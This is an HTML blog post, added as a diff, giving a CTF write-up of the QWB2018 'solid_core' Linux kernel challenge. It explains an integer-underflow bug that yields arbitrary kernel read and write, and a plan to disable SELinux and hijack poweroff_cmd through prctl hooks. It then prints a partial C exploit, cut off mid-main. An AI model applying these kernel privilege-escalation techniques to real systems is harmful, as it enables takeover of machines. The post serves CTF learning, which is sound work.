@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>QWB2018 solid_core Write Up | F0r_1st&#39;s Blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="" />
+  
+
+  <meta name="description" content="AnalyseIt’s a Linux Kernel Pwn slightly modified from CSAW2015_StringIPC  1234567891011121314151617181920212223242526static int realloc_ipc_channel ( struct ipc_state *state, int id, size_t size, int">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QWB2018 solid_core Write Up">
+<meta property="og:url" content="http://yoursite.com/2018/04/02/QWB2018-solid-core-Write-Up/index.html">
+<meta property="og:site_name" content="F0r_1st&#39;s Blog">
+<meta property="og:description" content="AnalyseIt’s a Linux Kernel Pwn slightly modified from CSAW2015_StringIPC  1234567891011121314151617181920212223242526static int realloc_ipc_channel ( struct ipc_state *state, int id, size_t size, int">
+<meta property="og:updated_time" content="2018-04-02T01:49:51.574Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="QWB2018 solid_core Write Up">
+<meta name="twitter:description" content="AnalyseIt’s a Linux Kernel Pwn slightly modified from CSAW2015_StringIPC  1234567891011121314151617181920212223242526static int realloc_ipc_channel ( struct ipc_state *state, int id, size_t size, int">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile"></span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text"></span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            Blog
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            Cago
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            Link
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            Srch
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts List</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Analyse"><span class="toc-text">Analyse</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-QWB2018-solid-core-Write-Up" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">QWB2018 solid_core Write Up</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.04.02</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>F0r_1st</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="https://Kirito0.github.io/2018/04/02/QWB2018-solid-core-Write-Up/#disqus_thread"></a>
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h1><p>It’s a Linux Kernel Pwn slightly modified from <a href="https://github.com/mncoppola/StringIPC" target="_blank" rel="noopener">CSAW2015_StringIPC</a> </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">realloc_ipc_channel</span> <span class="params">( struct ipc_state *state, <span class="keyword">int</span> id, <span class="keyword">size_t</span> size, <span class="keyword">int</span> grow )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_channel</span> *<span class="title">channel</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> new_size;</span><br><span class="line">    <span class="keyword">char</span> *new_data;</span><br><span class="line"></span><br><span class="line">    channel = get_channel_by_id(state, id);</span><br><span class="line">    <span class="keyword">if</span> ( IS_ERR(channel) )</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( grow )</span><br><span class="line">        new_size = channel-&gt;buf_size + size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        new_size = channel-&gt;buf_size - size;</span><br><span class="line"></span><br><span class="line">    new_data = krealloc(channel-&gt;data, new_size + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( new_data == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    channel-&gt;data = new_data;</span><br><span class="line">    channel-&gt;buf_size = new_size;</span><br><span class="line"></span><br><span class="line">    ipc_channel_put(state, channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The vulnerability is in the realloc_ipc_channel function. If we set new_size = -1(0xffffffffffffffff), the krealloc gets 0 as the second parameter.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZERO_SIZE_PTR ((void *)16)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">krealloc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *p, <span class="keyword">size_t</span> new_size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!new_size)) &#123;</span><br><span class="line">		kfree(p);</span><br><span class="line">		<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __do_krealloc(p, new_size, flags);</span><br><span class="line">	<span class="keyword">if</span> (ret &amp;&amp; p != ret)</span><br><span class="line">		kfree(p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(krealloc);</span><br></pre></td></tr></table></figure>
+<p>If the krealloc gets 0 of new_size, it returns ZERO_SIZE_PTR, which is not zero but 16. Therefore, we could pass the check of ‘if ( new_data == NULL )’ in realloc_ipc_channel and set channel-&gt;buf_size to 0xffffffffffffffff. As a result, we get write-anywhere and read-anywhere vulnerabilities.</p>
+<p>Unlike CSAS2015_SpringIPC, it limits the need to write an address greater than 0xffffffff80000000 (Kernel Base).</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>There is a syscall called prctl.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> = <span class="title">current</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line">	<span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">	error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">	<span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="function"><span class="params">			 <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> thisrc;</span><br><span class="line">	<span class="keyword">int</span> rc = -ENOSYS;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">	list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, <span class="built_in">list</span>) &#123;</span><br><span class="line">		thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">		<span class="keyword">if</span> (thisrc != -ENOSYS) &#123;</span><br><span class="line">			rc = thisrc;</span><br><span class="line">			<span class="keyword">if</span> (thisrc != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>prctl -&gt; security_task_prctl -&gt; (hp-&gt;hook.task_prctl), which is a virtual table -&gt; hijack.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> poweroff_cmd[POWEROFF_CMD_PATH_LEN] = <span class="string">"/sbin/poweroff"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_poweroff(<span class="keyword">bool</span> force)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = run_cmd(poweroff_cmd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &amp;&amp; force) &#123;</span><br><span class="line">		pr_warn(<span class="string">"Failed to start orderly shutdown: forcing the issue\n"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * I guess this should try to kick off some daemon to sync and</span></span><br><span class="line"><span class="comment">		 * poweroff asap.  Or not even bother syncing if we're doing an</span></span><br><span class="line"><span class="comment">		 * emergency shutdown?</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		emergency_sync();</span><br><span class="line">		kernel_power_off();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>In __orderly_poweroff, there is a run_cmd function, which takes poweroff_cmd as parameter, and the poweroff_cmd is a global variable, which could be changed by user.<br>Before run_cmd in Kernel to change the file permission of flag, we should close <a href="http://selinuxproject.org/page/Main_Page" target="_blank" rel="noopener">selinux</a> through selinux_disable.</p>
+<ol>
+<li>In general, we could exploit as follow:</li>
+<li>leak address of vdso near kernel base</li>
+<li>burst address of string “/sbin/poweroff”</li>
+<li>hook security_task_prctl to selinux_disable</li>
+<li>change poweroff_cmd to our cmd</li>
+<li>hooksecurity_task_prctl  to orderly_poweroff to execute our cmd</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error</span> <span class="params">( <span class="keyword">char</span> *msg )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span> <span class="params">( <span class="keyword">char</span> *addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> length )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; length / <span class="number">16</span>; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02hhx "</span>, addr[i * <span class="number">16</span> + j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_kernel_memory</span> <span class="params">( <span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr, <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> size )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">char</span> null_byte = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;seek_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(seek_channel));</span><br><span class="line">    seek_channel.id = id;</span><br><span class="line">    seek_channel.index = kaddr - <span class="number">0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;write_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(write_channel));</span><br><span class="line">    write_channel.id = id;</span><br><span class="line">    write_channel.buf = buf;</span><br><span class="line">    write_channel.count = size;</span><br><span class="line"></span><br><span class="line">    ret = ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_kernel_memory</span> <span class="params">( <span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">unsigned</span> <span class="keyword">long</span> kaddr, <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> size )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;seek_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(seek_channel));</span><br><span class="line">    seek_channel.id = id;</span><br><span class="line">    seek_channel.index = kaddr - <span class="number">0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;read_channel, <span class="number">0</span>, <span class="keyword">sizeof</span>(read_channel));</span><br><span class="line">    read_channel.id = id;</span><br><span class="line">    read_channel.buf = buf;</span><br><span class="line">    read_channel.count = size;</span><br><span class="line"></span><br><span class="line">    ret = ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_channel</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_channel</span>;</span></span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">"/proc/simp1e"</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    error(<span class="string">"open"</span>);</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;alloc_channel,<span class="number">0</span>,<span class="keyword">sizeof</span>(alloc_channel));</span><br><span class="line">  alloc_channel.buf_size = <span class="number">1</span>;</span><br><span class="line">  ret = 